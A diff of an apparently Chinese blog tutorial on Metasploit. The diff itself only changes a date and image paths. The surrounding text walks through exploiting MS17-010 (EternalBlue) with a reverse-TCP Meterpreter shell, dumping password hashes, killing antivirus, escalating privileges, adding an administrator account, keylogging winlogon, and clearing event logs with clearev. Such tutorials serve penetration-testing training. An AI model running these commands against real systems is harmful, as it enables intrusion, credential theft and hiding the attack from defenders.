@@ -517,7 +517,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2019-12-01
+                    2019-12-23
                 </div>
                 
 
@@ -577,7 +577,7 @@ MSF后期的升级：msfupdate</code></pre>
 <h2 id="MSF中加载自定义的exploit模块"><a href="#MSF中加载自定义的exploit模块" class="headerlink" title="MSF中加载自定义的exploit模块"></a>MSF中加载自定义的exploit模块</h2><p>参考文章：<a href="https://blog.csdn.net/qq_36119192/article/details/100609875" target="_blank" rel="noopener">CVE-2019-0708 远程桌面漏洞复现</a>  ，该文中介绍了如果加载自定义的exploit模块并且成功攻击。</p>
 <h2 id="漏洞利用-exploit"><a href="#漏洞利用-exploit" class="headerlink" title="漏洞利用(exploit)"></a>漏洞利用(exploit)</h2><p>漏洞利用exploit，也就是我们常说的 exp，他就是对漏洞进行攻击的代码。</p>
 <p>exploit漏洞利用模块路径：<strong>/usr/share/metasploit-framework/modules/exploits</strong></p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/1.png" alt="1"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/2018112911255362.png" alt="img"></p>
 <p>这里面有针对不同平台的 exploit 。</p>
 <p>我们现在就进 windows 平台看看，这里会列出针对windows平台不同服务的漏洞利用</p>
 <p><img src="https://img-blog.csdnimg.cn/20181129112641869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
@@ -630,47 +630,47 @@ windows/meterpreter/reverse_https  #通过监听443端口反向连接
 <p>我们在设置 payloads 时，可以将 payloads 设置为：windows/meterpreter/reverse_tcp ，然后获得了 meterpreter&gt; 之后我们就可以干很多事了！具体的做的事，在我们下面的后渗透阶段都有讲！</p>
 <h2 id="MS17-010-永恒之蓝"><a href="#MS17-010-永恒之蓝" class="headerlink" title="MS17_010(永恒之蓝)"></a>MS17_010(永恒之蓝)</h2><p>我们现在模拟使用 MS17_010 漏洞攻击，这个漏洞就是去年危害全球的勒索病毒利用的永恒之蓝漏洞。</p>
 <p>kali控制台输入：msfconsole   进入metasploit框架</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/2.png" alt="2"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/20181024144209135.png" alt="img"></p>
 <p>寻找MS17_010漏洞： search ms17_010 </p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/3.png" alt="3"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024144407456-1577066714692.png" alt="img"></p>
 <p>这里找到了两个模块，第一个<strong>辅助模块</strong>是探测主机是否存在MS17_010漏洞，第二个是<strong>漏洞利用模块</strong>，我们先探测哪些主机存在漏洞 </p>
 <h3 id="Auxiliary辅助探测模块"><a href="#Auxiliary辅助探测模块" class="headerlink" title="Auxiliary辅助探测模块"></a>Auxiliary辅助探测模块</h3><p>该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。</p>
 <p>输入命令：use auxiliary/scanner/smb/smb_ms17_010</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/4.png" alt="4"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024144611368.png" alt="img"></p>
 <p>查看这个模块需要配置的信息：show options</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/5.png" alt="5"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024144700742.png" alt="img"></p>
 <p>RHOSTS 参数是要探测主机的ip或ip范围，我们探测一个ip范围内的主机是否存在漏洞</p>
 <p>输入：set RHOSTS 192.168.125.125-129.168.125.140</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/6.png" alt="6"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024144840786.png" alt="img"></p>
 <p>输入：exploit  攻击，这里有+号的就是可能存在漏洞的主机，这里有3个主机存在漏洞</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/7.png" alt="7"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024145002468.png" alt="img"></p>
 <h3 id="Exploit漏洞利用模块"><a href="#Exploit漏洞利用模块" class="headerlink" title="Exploit漏洞利用模块"></a>Exploit漏洞利用模块</h3><p>然后我们就可以去利用漏洞攻击了，选择漏洞攻击模块： use exploit/windows/smb/ms17_010_eternalblue  </p>
 <p>查看这个漏洞的信息：info</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/8.png" alt="8"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024145213501.png" alt="img"></p>
 <p>查看可攻击的系统平台，这个命令显示该攻击模块针对哪些特定操作系统版本、语言版本的系统：show targets</p>
 <p>这里只有一个，有些其他的漏洞模块对操作系统的语言和版本要求的很严，比如MS08_067，这样就要我们指定目标系统的版本的。如果不设置的话，MSF会自动帮我们判断目标操作系统的版本和语言(利用目标系统的指纹特征)</p>
 <p><img src="https://img-blog.csdnimg.cn/20181201224731987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
 <h3 id="Payload攻击载荷模块"><a href="#Payload攻击载荷模块" class="headerlink" title="Payload攻击载荷模块"></a>Payload攻击载荷模块</h3><p>攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令。</p>
 <p>查看攻击载荷：show payloads</p>
 <p>该命令可以查看当前漏洞利用模块下可用的所有Payload</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/9.png" alt="9"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024192015317.png" alt="img"></p>
 <p>设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/10.png" alt="10"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024192157781.png" alt="img"></p>
 <p>查看模块需要配置的参数： show options</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/11.png" alt="11"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024192835893.png" alt="img"></p>
 <p>设置RHOST，也就是要攻击主机的ip：set  RHOST 192.168.125.138</p>
 <p>设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell：set LHOST 192.168.125.129</p>
 <p>如果我们这里不设置lport的话，默认是4444端口监听</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/12.png" alt="12"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024193336935.png" alt="img"></p>
 <p>攻击： exploit </p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/13.png" alt="13"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024145944639.png" alt="img"></p>
 <h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>运行了exploit命令之后，我们开启了一个reverse TCP监听器来监听本地的 4444 端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。运行成功之后，我们将会看到命令提示符 meterpreter &gt; 出现，我们输入： shell 即可切换到目标主机的windows shell，要想从目标主机shell退出到 meterpreter ，我们只需输入：exit</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/14.png" alt="14"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024193816868.png" alt="img"></p>
 <p>我们要想从 meterpreter 退出到MSF框架，输入：background</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/15.png" alt="15"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024194025537.png" alt="img"></p>
 <p>输入： sessions -l    查看我们获得的shell，前面有id</p>
 <p>输入： session -i 1   即可切换到id为1的shell</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/16.png" alt="16"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024194109171.png" alt="img"></p>
 <pre><code class="python">sysinfo             #查看目标主机系统信息
 run scraper         #查看目标主机详细信息
 run hashdump        #导出密码的哈希
@@ -718,7 +718,7 @@ run post/windows/gather/enum_applications       #列举应用程序
 run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码
 run windows/gather/smart_hashdump               #dump出所有用户的hash</code></pre>
 <p>输入：sysinfo  查看目标主机的信息</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/17.png" alt="17"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024194658593.png" alt="img"></p>
 <h3 id="查看主机是否运行在虚拟机上"><a href="#查看主机是否运行在虚拟机上" class="headerlink" title="查看主机是否运行在虚拟机上"></a>查看主机是否运行在虚拟机上</h3><pre><code>run post/windows/gather/checkvm</code></pre><p><img src="https://img-blog.csdnimg.cn/20190613151852676.png" alt="img"></p>
 <h3 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h3><p>拿到目标主机的shell后第一件事就是关闭掉目标主机的杀毒软件，通过命令：</p>
 <pre><code>run  killav</code></pre><p><img src="https://img-blog.csdnimg.cn/20181201224919634.png" alt="img"></p>
@@ -735,10 +735,10 @@ run windows/gather/smart_hashdump               #dump出所有用户的hash</cod
 <p>mkdir：新建目录；</p>
 <p>rmdir：删除目录； </p>
 </blockquote>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/18.png" alt="18"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024200950763.png" alt="img"></p>
 <h3 id="上传-下载文件"><a href="#上传-下载文件" class="headerlink" title="上传/下载文件"></a>上传/下载文件</h3><p>download file 命令可以帮助我们从目标系统中下载文件</p>
 <p>upload file 命令则能够向目标系统上传文件。</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/19.png" alt="19"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024201203500.png" alt="img"></p>
 <h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个 getsystem 命令，它可以使用多种技术在目标系统中实现提权：</p>
 <p>getuid 命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户身材为 NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。</p>
 <p>注：执行getsystem命令后，会显示错误，但是其实已经运行成功了！</p>
@@ -781,13 +781,13 @@ run windows/gather/smart_hashdump               #dump出所有用户的hash</cod
 </blockquote>
 <p><img src="https://img-blog.csdnimg.cn/20190613152431226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
 <h3 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h3><p>输入：screenshot ，截图目标主机屏幕，可以看到，图片被保存到了　/root 目录下</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/20.png" alt="20"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024194503136.png" alt="img"></p>
 <h3 id="创建一个新账号"><a href="#创建一个新账号" class="headerlink" title="创建一个新账号"></a>创建一个新账号</h3><p>先查看目标主机有哪些用户</p>
 <p>run post/windows/gather/enum_logged_on_users</p>
 <p><img src="https://img-blog.csdnimg.cn/20190613152519616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
 <p>接下来，我们可以在目标系统中创建一个新的用户账号：run getgui -u hack -p 123，这个命令会创建用户，并把他添加到 Administrators 组中，这样该用户就拥有远程桌面的权限了。</p>
 <p>这里成功创建了用户，但是添加到Administrators组中失败了 !</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/21.png" alt="21"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024204129911.png" alt="img"></p>
 <p>如果添加到Administrators组中失败了的话，我们可以运行：shell ，进行cmd窗口手动将该用户添加到administrators组中。</p>
 <h3 id="启用远程桌面"><a href="#启用远程桌面" class="headerlink" title="启用远程桌面"></a>启用远程桌面</h3><p>当我们新添加的用户已经拥有远程桌面之后，我们就可以使用这个账号凭证来开启远程桌面会话了。</p>
 <p>首先，我们需要确保目标Windows设备开启了远程桌面功能（需要开启多个服务），不过我们的 getgui 脚本可以帮我们搞定。我们可以使用-e参数确保目标设备开启了远程桌面功能（重启之后同样会自动开启），我们输入： run getgui -e 或者 run post/windows/manage/enable_rdp</p>
@@ -804,12 +804,12 @@ run windows/gather/smart_hashdump               #dump出所有用户的hash</cod
 <h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>Meterpreter 既可以单独运行，也可以与其他进程进行绑定。因此，我们可以让Meterpreter与类似explorer.exe这样的进程进行绑定，并以此来实现持久化。</p>
 <p>在下面的例子中，我们会将Meterpreter跟 winlogon.exe 绑定，并在登录进程中捕获键盘记录，以获得用户的密码。</p>
 <p>首先，我们需要使用： ps 命令查看目标设备中运行的进程：</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/22.png" alt="22"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024205922640.png" alt="img"></p>
 <p>我们可以使用： getpid 查看我们当前的进程id</p>
 <p>使用： migrate 目标进程ID 命令来绑定目标进程id，这里绑定目标pid的时候，经常会断了 shell。进程迁移后会自动关闭原来进程，没有关闭可使用 kill pid 命令关闭进程。或者使用自动迁移进程（<code>run post/windows/manage/migrate</code>）命令，系统会自动寻找合适的进程然后迁移。</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/23.png" alt="23"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024210059946.png" alt="img"></p>
 <p>绑定完成之后，我们就可以开始捕获键盘数据了，可以看到，用户输入了 123 然后回车，说明密码是 123</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/24.png" alt="24"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/20181024221024686.png" alt="img"></p>
 <h3 id="禁止目标主机使用键盘鼠标"><a href="#禁止目标主机使用键盘鼠标" class="headerlink" title="禁止目标主机使用键盘鼠标"></a>禁止目标主机使用键盘鼠标</h3><ul>
 <li>禁止(允许)目标使用键盘： uictl disable (enable) keyboard</li>
 <li>禁止(允许)目标使用鼠标： uictl disable (enable) mouse</li>
@@ -849,7 +849,7 @@ run windows/gather/smart_hashdump               #dump出所有用户的hash</cod
 <pre><code class="python">rdesktop 127.0.0.1:3389</code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20190617175054738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
 <h3 id="清除事件日志"><a href="#清除事件日志" class="headerlink" title="清除事件日志"></a>清除事件日志</h3><p>完成攻击操作之后，千万别忘了“打扫战场”。我们的所有操作都会被记录在目标系统的日志文件之中，因此我们需要在完成攻击之后使用命令 clearev 命令来清除事件日志：</p>
-<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/25.png" alt="25"></p>
+<p><img src="/2018/10/24/metasploit-framework-msf-de-shi-yong/../../source/_posts/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/2018102421175848.png" alt="img"></p>
 <h2 id="导入并执行PowerShell脚本"><a href="#导入并执行PowerShell脚本" class="headerlink" title="导入并执行PowerShell脚本"></a>导入并执行PowerShell脚本</h2><p>如果powershell脚本是用于域内信息收集的，则获取到的权限用户需要是域用户</p>
 <pre><code class="python">load powershell            #加载powershell功能
 powershell_import /root/PowerView.ps1      #导入powershell脚本，提前将该powershell脚本放到指定目录
